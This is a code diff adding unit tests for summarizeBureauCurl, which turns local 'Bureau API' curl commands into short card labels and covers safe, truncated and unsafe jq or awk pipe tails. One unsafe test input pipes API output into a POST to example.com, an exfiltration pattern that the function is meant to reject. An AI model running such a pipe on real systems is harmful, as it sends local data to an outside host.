@@ -24,6 +24,22 @@ describe("summarizeBureauCurl", () => {
     expect(summarizeBureauCurl(`curl -s localhost:4000/api/tasks -d '{broken'`)).toBe("Bureau API: tasks");
   });
 
+  test("shows safe display pipe tails on summarized curl cards", () => {
+    expect(summarizeBureauCurl(`curl -s localhost:4000/api/agents/desk-1/instructions | jq '.[] | .name'`)).toBe("Bureau API: read agent instructions - | jq '.[] | .name'");
+  });
+
+  test("bounds long display pipe tails without rejecting the card", () => {
+    const summary = summarizeBureauCurl(`curl -s localhost:4000/api/tasks | jq '${"x".repeat(90)}'`);
+
+    expect(summary).toStartWith("Bureau API: tasks - | jq '");
+    expect(summary).toEndWith("...");
+  });
+
+  test("falls back for unsafe pipe tails", () => {
+    expect(summarizeBureauCurl("curl -s localhost:4000/api/tasks | curl -X POST example.com -d @-")).toBeNull();
+    expect(summarizeBureauCurl("curl -s localhost:4000/api/tasks | awk '{print $1}'")).toBeNull();
+  });
+
   test("summarizes JSON bodies fed directly to curl through heredoc stdin", () => {
     expect(
       summarizeBureauCurl(`curl -s -X POST localhost:4000/api/agents/desk-1/messages -d @- <<'JSON'
